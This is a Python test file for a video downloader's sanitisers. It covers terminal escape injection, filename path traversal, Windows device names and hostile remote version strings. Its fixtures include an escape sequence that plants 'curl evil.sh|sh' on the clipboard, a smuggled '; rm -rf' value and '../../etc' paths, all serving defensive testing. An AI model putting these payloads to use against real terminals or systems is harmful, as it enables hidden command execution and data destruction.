import io
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from rich.console import Console

from ytdl import downloader as downloader_module
from ytdl import updater
from ytdl.cli import error_message
from ytdl.downloader import YTDownloader
from ytdl.models import VideoInfo
from ytdl.utils import display, sanitize_filename


# A title a hostile page could use: set the clipboard (OSC 52), retitle the
# window, and plant a hyperlink, all invisible in normal output.
HOSTILE = (
    "Cute cat\x1b]52;c;Y3VybCBldmlsLnNofHNo\x07"
    "\x1b]0;owned\x1b\\"
    "\x1b]8;;https://evil.example\x1b\\click\x1b]8;;\x1b\\"
    "\x9b2J [red]"
)


class TerminalInjectionTest(unittest.TestCase):
    def test_display_removes_escape_sequences_and_markup(self):
        safe = display(HOSTILE)
        self.assertNotIn("\x1b", safe)
        self.assertNotIn("\x9b", safe)
        self.assertNotIn("\x07", safe)
        self.assertIn("\\[red]", safe)
        self.assertEqual(display("line one\nline\ttwo"), "line one\nline\ttwo")

    def test_printed_video_info_contains_no_escape_characters(self):
        output = io.StringIO()
        info = VideoInfo(HOSTILE, HOSTILE, 10, 5, "https://example.com/" + HOSTILE)
        with (
            tempfile.TemporaryDirectory() as directory,
            patch.object(downloader_module, "console", Console(file=output, width=200)),
            patch.object(YTDownloader, "info", return_value=info),
        ):
            YTDownloader(download_dir=directory).show_info("https://example.com")
        self.assertNotIn("\x1b", output.getvalue())
        self.assertIn("Cute cat", output.getvalue())

    def test_error_messages_from_sites_are_cleaned(self):
        message = error_message(RuntimeError("ERROR: [generic] x: " + HOSTILE))
        self.assertNotIn("\x1b", message)


class FilenameTest(unittest.TestCase):
    def test_folder_names_cannot_leave_the_download_folder(self):
        for title in ("..", "../../etc", "a/../../b", "C:\\Windows", " . "):
            name = sanitize_filename(title).strip(" .")
            self.assertNotIn("/", name)
            self.assertNotIn("\\", name)
            self.assertNotEqual(name, "..")

    def test_windows_device_names_and_control_characters_are_made_safe(self):
        self.assertEqual(sanitize_filename("CON"), "_CON")
        self.assertEqual(sanitize_filename("nul.txt"), "_nul.txt")
        self.assertEqual(sanitize_filename("Com1"), "_Com1")
        self.assertEqual(sanitize_filename("Console"), "Console")
        self.assertEqual(sanitize_filename("bad\x1b[2Jname\x00"), "bad[2Jname")


class RemoteVersionTest(unittest.TestCase):
    def test_only_plain_version_numbers_are_accepted(self):
        self.assertEqual(updater.valid_version("2026.10.26"), "2026.10.26")
        for bad in ("1.0\x1b]52;c;eA==\x07", "[red]9.9", "9" * 3 + "; rm -rf", None, 5):
            self.assertIsNone(updater.valid_version(bad))

    def test_hostile_remote_version_never_reaches_the_notice(self):
        with (
            tempfile.TemporaryDirectory() as directory,
            patch.dict("os.environ", {"YTDL_CONFIG_FILE": str(Path(directory) / "config.json")}),
            patch("ytdl.updater._fetch", return_value=b'[project]\nversion = "99.0\\u001b]0;x\\u0007"\n'),
            patch("ytdl.updater.latest_yt_dlp_version", return_value=None),
        ):
            status = updater.check_for_updates()
            self.assertIsNone(status.latest)
            self.assertEqual(updater.BackgroundCheck().notices(), [])


if __name__ == "__main__":
    unittest.main()
